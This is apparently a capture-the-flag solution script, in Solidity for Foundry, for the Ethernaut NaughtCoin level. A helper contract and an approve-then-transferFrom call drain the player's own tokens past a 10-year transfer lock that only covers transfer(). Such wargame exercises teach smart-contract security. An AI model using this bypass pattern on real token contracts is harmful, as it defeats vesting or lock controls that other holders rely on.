/*
NaughtCoin is an ERC20 token and you're already holding all of them. 
The catch is that you'll only be able to transfer them after a 10 year lockout period. 
Can you figure out how to get them out to another address so that you can transfer them freely? 
Complete this level by getting your token balance to 0.

  Things that might help

The ERC20 Spec
The OpenZeppelin codebase

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "src/NaughtCoin.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract WithdrawMoney {
    NaughtCoin public naughtCoin;

    constructor(NaughtCoin _naughtCoin) {
        naughtCoin = _naughtCoin;
    }

    function attack() public {
        naughtCoin.transferFrom(msg.sender, address(this), naughtCoin.balanceOf(msg.sender));
    }
}

contract NaughtCoinSolution is Script {
    function run() external {
        // i can approve my all tokens to the attack contract and then transferFrom to withdraw the tokens
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        NaughtCoin naughtCoin = NaughtCoin(0xE002BADce977D60061e8Ac25b8995A058c9c468b);
        console.log("Initial balance:", naughtCoin.balanceOf(vm.envAddress("MY_ADDRESS")));
        WithdrawMoney withdrawMoney = new WithdrawMoney(naughtCoin);
        naughtCoin.approve(address(withdrawMoney), naughtCoin.balanceOf(vm.envAddress("MY_ADDRESS")));
        withdrawMoney.attack();
        console.log("Final balance:", naughtCoin.balanceOf(vm.envAddress("MY_ADDRESS")));
        console.log("Final balance of contract:", naughtCoin.balanceOf(address(withdrawMoney)));
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
